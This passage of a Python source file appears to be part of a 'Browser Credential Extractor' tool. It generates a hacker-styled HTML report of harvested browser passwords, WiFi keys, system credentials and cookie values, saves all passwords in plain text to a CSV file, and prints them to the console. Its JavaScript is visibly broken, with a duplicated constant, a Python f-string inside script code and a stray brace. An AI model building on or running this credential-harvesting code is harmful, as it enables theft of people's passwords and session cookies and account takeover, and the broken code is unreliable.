                        <i class="fas fa-terminal"></i> Comprehensive Browser Credential Analysis Report
                    </p>

                    <div class="header-meta">
                        <div class="meta-item">
                            <i class="fas fa-user-secret meta-icon" style="color: #fffff"></i>
                            <div>
                                <div style="font-size: 0.9rem; color: var(--hacker-green-light);">Auditor</div>
                                <div style="font-weight: bold;">''' + getpass.getuser() + '''</div>
                            </div>
                        </div>

                        <div class="meta-item">
                            <i class="fas fa-calendar-alt meta-icon" style="color: #fffff"></i>
                            <div>
                                <div style="font-size: 0.9rem; color: var(--hacker-green-light);">Scan Date</div>
                                <div style="font-weight: bold;">''' + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + '''</div>
                            </div>
                        </div>

                        <div class="meta-item">
                            <i class="fas fa-desktop meta-icon" style="color: #fffff"></i>
                            <div>
                                <div style="font-size: 0.9rem; color: var(--hacker-green-light);">System</div>
                                <div style="font-weight: bold;">''' + platform.system() + '''</div>
                            </div>
                        </div>

                        <div class="meta-item">
                            <i class="fas fa-clock meta-icon" style="color: #fffff"></i>
                            <div>
                                <div style="font-size: 0.9rem; color: var(--hacker-green-light);">Scan Duration</div>
                                <div style="font-weight: bold;">Real-time</div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>

            <!-- Dashboard Stats -->
            <div class="dashboard-stats">
                <div class="stat-card">
                    <i class="fas fa-key stat-icon" style="color: var(--warning-orange);"></i>
                    <div class="stat-count">''' + str(len(passwords)) + '''</div>
                    <div class="stat-label">Total Passwords</div>
                    <div style="font-size: 0.8rem; margin-top: 8px; color: var(--hacker-green-light);">
                        Across ''' + str(len(passwords_by_browser)) + ''' browsers
                    </div>
                </div>

                <div class="stat-card">
                    <i class="fas fa-wifi stat-icon" style="color: var(--info-blue);"></i>
                    <div class="stat-count">''' + str(len(wifi_passwords)) + '''</div>
                    <div class="stat-label">WiFi Networks</div>
                    <div style="font-size: 0.8rem; margin-top: 8px; color: var(--hacker-green-light);">
                        ''' + str(len([w for w in wifi_passwords if w['password'] != 'Not found'])) + ''' with passwords
                    </div>
                </div>

                <div class="stat-card">
                    <i class="fas fa-cookie-bite stat-icon" style="color: var(--accent-purple);"></i>
                    <div class="stat-count">''' + str(len(cookies)) + '''</div>
                    <div class="stat-label">Browser Cookies</div>
                    <div style="font-size: 0.8rem; margin-top: 8px; color: var(--hacker-green-light);">
                        Session tracking data
                    </div>
                </div>

                <div class="stat-card">
                    <i class="fas fa-user-lock stat-icon" style="color: var(--danger-red);"></i>
                    <div class="stat-count">''' + str(len(system_credentials)) + '''</div>
                    <div class="stat-label">System Credentials</div>
                    <div style="font-size: 0.8rem; margin-top: 8px; color: var(--hacker-green-light);">
                        Encrypted system secrets
                    </div>
                </div>
            </div>

            <!-- Browser Passwords Sections -->
    '''

    # Add browser password sections
    for browser, browser_passwords in passwords_by_browser.items():
        if browser_passwords:
            badge_class = f"{browser.lower()}-badge"
            html_content += f'''
            <section class="data-section">
                <div class="section-header">
                    <div class="section-title">
                        <i class="fas fa-key"></i>
                        <span>{browser.upper()} PASSWORDS</span>
                        <span class="section-badge {'danger' if any('[Decryption Failed' in p['password'] for p in browser_passwords) else 'warning'}" style="color: #fffff">
                            {len(browser_passwords)} credentials
                        </span>
                    </div>
                </div>

                <div id="{browser.lower()}-table" class="collapsed">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th width="30%">URL / Domain</th>
                                <th width="20%">Username</th>
                                <th width="25%">Password</th>
                                <th width="15%">Last Used</th>
                                <th width="10%">Profile</th>
                            </tr>
                        </thead>
                        <tbody>
            '''

            for pwd in browser_passwords[:]:
                password_display = pwd['password']
                password_class = "password-cell"

                if "[Encrypted" in password_display:
                    password_class += " encrypted"
                elif "[Decryption Failed" in password_display:
                    password_class += " corrupted"
                elif password_display and len(password_display) < 500:
                    password_class += " decrypted"

                html_content += f'''
                            <tr>
                                <td class="url-cell" title="{pwd['url']}">
                                    <i class="fas fa-globe" style="margin-right: 8px; color: var(--info-blue);"></i>
                                    {pwd['url'][:80]}{'...' if len(pwd['url']) > 80 else ''}
                                </td>
                                <td>
                                    <i class="fas fa-user" style="margin-right: 8px; color: var(--hacker-green-light);"></i>
                                    {pwd['username'] if pwd['username'] else '<span style="color: var(--warning-orange);">[Empty]</span>'}
                                </td>
                                <td>
                                    <span class="{password_class}" title="{password_display}">
                                        {password_display[:100]}{'...' if len(password_display) > 100 else ''}
                                    </span>
                                </td>
                                <td>
                                    <i class="fas fa-clock" style="margin-right: 8px; color: var(--hacker-green-light);"></i>
                                    {pwd['date_last_used']}
                                </td>
                                <td>
                                    <span class="browser-badge {badge_class}">
                                        {pwd['profile']}
                                    </span>
                                </td>
                            </tr>
                '''

            html_content += f'''
                        </tbody>
                    </table>
                </div>
            </section>
            '''

    # Wi-Fi Passwords Section
    if wifi_passwords:
        html_content += f'''
        <section class="data-section">
            <div class="section-header">
                <div class="section-title">
                    <i class="fas fa-wifi"></i>
                    <span>WIRELESS NETWORKS</span>
                    <span class="section-badge {'warning' if any(w['password'] == 'Not found' for w in wifi_passwords) else ''}">
                        {len(wifi_passwords)} networks
                    </span>
                </div>
            </div>

            <div class="collapsed">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th width="30%">SSID / Network Name</th>
                            <th width="30%">Password</th>
                            <th width="20%">Security Type</th>
                            <th width="20%">Status</th>
                        </tr>
                    </thead>
                    <tbody>
        '''

        for wifi in wifi_passwords:
            risk_class = "risk-high" if wifi['password'] == "Not found" else "risk-medium" if "WEP" in wifi[
                'security'] else "risk-low"
            html_content += f'''
                        <tr>
                            <td>
                                <i class="fas fa-network-wired" style="margin-right: 8px; color: var(--info-blue);"></i>
                                {wifi['ssid']}
                            </td>
                            <td>
                                <span class="password-cell {'decrypted' if wifi['password'] != 'Not found' else 'encrypted'}" title="{wifi['password']}">
                                    <i class="fas fa-key"></i> {wifi['password'][:30]}{'...' if len(wifi['password']) > 30 else ''}
                                </span>
                            </td>
                            <td>
                                <span class="risk-indicator {risk_class}">
                                    <i class="fas fa-shield-alt"></i> {wifi['security']}
                                </span>
                            </td>
                            <td>
                                <span class="risk-indicator {'risk-high' if wifi['password'] == 'Not found' else 'risk-low'}">
                                    {'<i class="fas fa-times-circle"></i> No Access' if wifi['password'] == 'Not found' else '<i class="fas fa-check-circle"></i> Access Available'}
                                </span>
                            </td>
                        </tr>
            '''

        html_content += '''
                    </tbody>
                </table>
            </div>
        </section>
        '''

    # System Credentials Section
    if system_credentials:
        html_content += f'''
        <section class="data-section">
            <div class="section-header">
                <div class="section-title">
                    <i class="fas fa-user-lock"></i>
                    <span>SYSTEM CREDENTIALS</span>
                    <span class="section-badge danger">
                        {len(system_credentials)} secured
                    </span>
                </div>
            </div>

            <div class="collapsed">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th width="20%">Credential Type</th>
                            <th width="40%">Target / Service</th>
                            <th width="20%">Username</th>
                            <th width="20%">Security Level</th>
                        </tr>
                    </thead>
                    <tbody>
        '''

        for cred in system_credentials:
            html_content += f'''
                        <tr>
                            <td>
                                <i class="fas fa-id-card" style="margin-right: 8px; color: var(--accent-purple);"></i>
                                {cred['type']}
                            </td>
                            <td class="url-cell" title="{cred['target']}">
                                <i class="fas fa-server" style="margin-right: 8px; color: var(--info-blue);"></i>
                                {cred['target'][:100]}{'...' if len(cred['target']) > 100 else ''}
                            </td>
                            <td>
                                <span style="color: var(--warning-orange);">
                                    <i class="fas fa-user-ninja"></i> {cred['username']}
                                </span>
                            </td>
                            <td>
                                <span class="risk-indicator risk-high">
                                    <i class="fas fa-lock"></i> {cred['password']}
                                </span>
                            </td>
                        </tr>
            '''

        html_content += '''
                    </tbody>
                </table>
            </div>
        </section>
        '''

    # Cookies Section
    if cookies:
        html_content += f'''
        <section class="data-section">
            <div class="section-header">
                <div class="section-title">
                    <i class="fas fa-cookie-bite"></i>
                    <span>BROWSER COOKIES</span>
                    <span class="section-badge">
                        {len(cookies)} tracking cookies
                    </span>
                </div>
            </div>

            <div id="cookies-table" class="collapsed">
                <table class="data-table">
                    <thead>
                        <tr>
                            <th width="15%">Browser</th>
                            <th width="25%">Domain</th>
                            <th width="20%">Cookie Name</th>
                            <th width="25%">Value</th>
                            <th width="15%">Security</th>
                        </tr>
                    </thead>
                    <tbody>
        '''

        for cookie in cookies[:]:
            secure_badge = '<span class="risk-indicator risk-low"><i class="fas fa-lock"></i> Secure</span>' if cookie[
                                                                                                                    'secure'] == 'Yes' else '<span class="risk-indicator risk-medium"><i class="fas fa-unlock"></i> Insecure</span>'
            html_content += f'''
                        <tr>
                            <td>
                                <span class="browser-badge {cookie['browser'].lower()}-badge">
                                    {cookie['browser']}
                                </span>
                            </td>
                            <td>
                                <i class="fas fa-globe" style="margin-right: 8px; color: var((--info-blue));"></i>
                                {cookie['domain']}
                            </td>
                            <td>
                                <i class="fas fa-tag" style="margin-right: 8px; color: var(--hacker-green-light);"></i>
                                {cookie['cookie_name'][:20]}{'...' if len(cookie['cookie_name']) > 20 else ''}
                            </td>
                            <td class="url-cell" title="{cookie['value']}">
                                {cookie['value'][:30]}{'...' if len(cookie['value']) > 30 else ''}
                            </td>
                            <td>
                                {secure_badge}
                            </td>
                        </tr>
            '''

        html_content += f'''
                    </tbody>
                </table>
                {'<p style="margin-top: 15px; color: var(--warning-orange);"><i class="fas fa-info-circle"></i> Showing 20 of ' + str(len(cookies)) + ' cookies</p>' if len(cookies) > 20 else ''}
            </div>
        </section>
        '''

    # Footer
    html_content += f'''
        </div>

        <!-- JavaScript -->
        <script>
            // Matrix background effect
            const canvas = document.getElementById('matrix-bg');
            const ctx = canvas.getContext('2d');

            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            const chars = '01アイウエオカキクケコサシスセソタチツテトabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$+-*/=%"#&_()[]<>!?;:.,|\\';
            const charArray = chars.split('');
            const fontSize = 14;
            const columns = canvas.width / fontSize;
            const drops = Array(Math.floor(columns)).fill(1);
            const fontSize = 14;  // Add this definition
            ctx.font = fontSize + "px 'Courier New', monospace";  // Use string concatenation
            
            function drawMatrix() {{
                ctx.fillStyle = 'rgba(10, 10, 10, 0.04)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);

                ctx.fillStyle = '#00ff41';
                ctx.font = f"{fontSize}px 'Courier New', monospace"

                for (let i = 0; i < drops.length; i++) {{
                    const text = charArray[Math.floor(Math.random() * charArray.length)];
                    const x = i * fontSize;
                    const y = drops[i] * fontSize;

                    ctx.fillText(text, x, y);

                    if (y > canvas.height && Math.random() > 0.975) {{
                        drops[i] = 0;
                    }}
                    drops[i]++;
                }}
            }}

            setInterval(drawMatrix, 50);

            // Window resize handler
            window.addEventListener('resize', function() {{
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }});

            function toggleAllSections() {{
                const sections = document.querySelectorAll('[id$="-table"]');
                const allCollapsed = Array.from(sections).every(s => s.classList.contains('collapsed'));

                sections.forEach(section => {{
                    if (allCollapsed) {{
                        section.classList.remove('collapsed');
                        section.style.maxHeight = 'none';
                    }} else {{
                        section.classList.add('collapsed');
                        section.style.maxHeight = '400px';
                    }}
                }});

                }});
            }}

            // Highlight rows on hover
            document.querySelectorAll('.data-table tbody tr').forEach(row => {{
                row.addEventListener('mouseenter', function() {{
                    this.style.transform = 'scale(1.01)';
                    this.style.boxShadow = '0 5px 15px rgba(0, 255, 0, 0.1)';
                }});

                row.addEventListener('mouseleave', function() {{
                    this.style.transform = 'scale(1)';
                    this.style.boxShadow = 'none';
                }});
            }});

            // Export functionality
            function exportToCSV() {{
                alert('CSV export would be generated here.\\nIn a full implementation, this would download a CSV file.');
                // In a real implementation, this would trigger CSV download
            }}

            // Auto-expand sections with important warnings
            document.addEventListener('DOMContentLoaded', function() {{
                // Find sections with dangerous content
                const dangerousSections = document.querySelectorAll('.section-badge.danger');
                dangerousSections.forEach(badge => {{
                    const section = badge.closest('.data-section');
                    const toggleBtn = section.querySelector('.toggle-btn');
                    if (toggleBtn) toggleBtn.click();
                }});

                // Initialize all collapsed sections
                document.querySelectorAll('.collapsed').forEach(section => {{
                    section.style.maxHeight = '400px';
                    section.style.overflowY = 'auto';
                }});
            }});
        </script>
    </body>
    </html>
    '''

    # Write HTML file
    with open(report_path, 'w', encoding='utf-8') as f:
        f.write(html_content)

    print(f"\n[+] Enhanced report generated: {report_path}")
    return report_path

def save_to_csv(passwords, filename="browser_passwords.csv"):
    """Save passwords to CSV file"""
    import csv

    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['browser', 'url', 'username', 'password', 'date_created', 'date_last_used', 'profile']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for pwd in passwords:
            writer.writerow(pwd)

    print(f"[+] Passwords saved to CSV: {filename}")
    return filename


def print_summary(passwords):
    """Print summary of extracted passwords"""
    print("\n" + "=" * 70)
    print("EXTRACTION SUMMARY")
    print("=" * 70)

    # Count by browser
    browsers = {}
    for pwd in passwords:
        browser = pwd['browser']
        browsers[browser] = browsers.get(browser, 0) + 1

    for browser, count in browsers.items():
        print(f"{browser}: {count} passwords")

    # Show some examples
    print("\n[+] Sample extracted credentials:")
    for i, pwd in enumerate(passwords[:]):
        print(f"\n  {i + 1}. {pwd['browser']}")
        print(f"     URL: {pwd['url'][:70]}{'...' if len(pwd['url']) > 70 else ''}")
        print(f"     Username: {pwd['username']}")
        print(f"     Password: {pwd['password']}")

    if len(passwords) > 5:
        print(f"\n  ... and {len(passwords) - 5} more")


# Main execution
if __name__ == "__main__":
    import sys

    print("Browser Credential Extractor v1.0")

    try:
        # Extract all passwords
        all_passwords = get_all_browser_passwords()

        if all_passwords:
            # Print summary
            print_summary(all_passwords)

            # Save to CSV
            csv_file = save_to_csv(all_passwords)

            print("\n" + "=" * 70)
            print("EXTRACTION COMPLETE")
            print("=" * 70)
            print(f"Total passwords extracted: {len(all_passwords)}")
            print(f"Report saved to HTML and CSV files")
            print("=" * 70)
        else:
            print("\n[!] No passwords found or extraction failed.")

    except Exception as e:
        print(f"\n[!] Error during extraction: {e}")
        import traceback


        traceback.print_exc()

